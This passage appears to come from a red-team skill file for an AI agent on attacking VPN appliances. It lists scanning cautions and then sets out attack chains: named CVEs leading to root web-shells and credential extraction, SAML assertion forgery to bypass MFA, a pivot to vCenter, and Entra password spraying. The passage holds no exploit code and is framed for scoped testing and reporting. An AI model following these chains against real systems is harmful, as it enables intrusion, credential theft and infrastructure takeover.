- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface

---

## Related Skills & Chains

- **`hunt-rce`** — Every major VPN appliance (Pulse Secure, Fortinet, Citrix, Ivanti, Palo Alto) has shipped pre-auth path-traversal-to-RCE in the last 24 months. Chain primitive: VPN appliance CVE (e.g., Ivanti ICS CVE-2024-21887, Citrix Bleed CVE-2023-4966, Fortinet CVE-2024-21762) → `hunt-rce` pre-auth path traversal → arbitrary file write into web-root → request the file → web-shell as `root` → VPN config + LDAP bind credentials extracted.
- **`hunt-saml`** — VPN SAML SP misconfig persists even on fully-patched appliances. Chain primitive: appliance patched against latest CVE but `/saml/metadata` reachable → IdP fingerprinted → `hunt-saml` XSW or comment-injection against IdP → forged assertion → VPN session established without password/MFA.
- **`vmware-vcenter-attack`** — Post-VPN-foothold the natural next pivot is vCenter. Chain primitive: VPN web-shell → cred extraction from VPN appliance config (LDAP bind, RADIUS shared secret) → reuse against internal vCenter → if scope permits, `vmware-vcenter-attack` → datacenter takeover.
- **`hunt-ntlm-info`** — Some VPN appliances expose anonymous NTLM on management paths. Chain primitive: VPN admin portal NTLM Type-2 capture → `hunt-ntlm-info` AV_PAIR decode → internal AD forest name → `m365-entra-attack` Entra spray on synced tenant.
- **`mid-engagement-ir-detection`** + **`redteam-report-template`** — VPN appliance CVE exploitation is high-noise; SOC patches fast. Chain primitive: confirmed CVE → baseline capture via `mid-engagement-ir-detection` → if appliance updates mid-test, capture the patched-state as a SECOND finding → run both findings through `triage-validation` → package via `redteam-report-template` with explicit critical-infrastructure framing.
